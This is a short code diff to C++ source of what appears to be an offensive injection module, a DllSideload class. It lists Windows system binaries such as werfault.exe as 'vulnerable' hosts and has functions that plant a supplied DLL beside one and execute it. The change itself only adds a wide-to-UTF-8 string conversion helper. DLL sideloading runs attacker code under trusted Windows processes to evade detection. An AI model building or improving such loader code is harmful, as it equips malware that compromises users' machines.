@@ -7,6 +7,15 @@
 
 namespace l4g::injection {
 
+static std::string narrow(const wchar_t* wide) {
+    if (!wide) return {};
+    int need = WideCharToMultiByte(CP_UTF8, 0, wide, -1, nullptr, 0, nullptr, nullptr);
+    if (need <= 1) return {};
+    std::string out((size_t)need - 1, '\0');
+    WideCharToMultiByte(CP_UTF8, 0, wide, -1, out.data(), need, nullptr, nullptr);
+    return out;
+}
+
 const DllSideload::VulnerableBinary DllSideload::VULNERABLE_BINARIES[] = {
     {L"C:\\Windows\\System32\\werfault.exe", L"wer.dll", L""},
     {L"C:\\Windows\\System32\\devobj.dll", L"devobj.dll", L""},
@@ -28,7 +37,7 @@ SideloadResult DllSideload::sideload_dll(const std::vector<uint8_t>& dll_data, c
     }
     
     result.success = true;
-    result.dll_path = std::string(dll_path.begin(), dll_path.end());
+    result.dll_path = narrow(dll_path.c_str());
     return result;
 }
 
@@ -49,7 +58,7 @@ SideloadResult DllSideload::deploy_and_execute(const std::vector<uint8_t>& dll_d
     result = sideload_dll(dll_data, target_dir, bin.dll_name);
     if (!result.success) return result;
     
-    result.target_exe = std::string(bin.path.begin(), bin.path.end());
+    result.target_exe = narrow(bin.path);
     
     if (!execute_binary(bin.path, bin.args)) {
         result.error = "Failed to execute binary";
